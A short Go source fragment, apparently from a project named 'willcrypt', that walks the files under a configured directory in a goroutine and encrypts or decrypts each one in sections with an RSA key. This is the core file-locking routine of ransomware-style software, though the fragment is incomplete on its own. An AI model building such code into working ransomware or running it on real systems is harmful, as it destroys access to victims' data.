package main

import (
	"crypto/rsa"
	"sync"

	"github.com/sywc670/willcrypt/pkg/wcrypt"
)

func goWalkCryption(priv *rsa.PrivateKey, wg *sync.WaitGroup) {
	startDir := cfg.Location
	encryptionOrDecryption := func(filepath string, isEncrypted bool) {
		if isEncrypted {
			debug(filepath, " decrypting...")
			// wcrypt.Decrypt(filepath, priv)
			wcrypt.DecryptBySection(filepath, priv)
		} else if !isEncrypted {
			debug(filepath, " encrypting...")
			// wcrypt.Encrypt(filepath, priv)
			wcrypt.EncryptBySection(filepath, priv)
		}
	}
	debug("Start Walk")
	go walk(startDir, wg, encryptionOrDecryption)
}
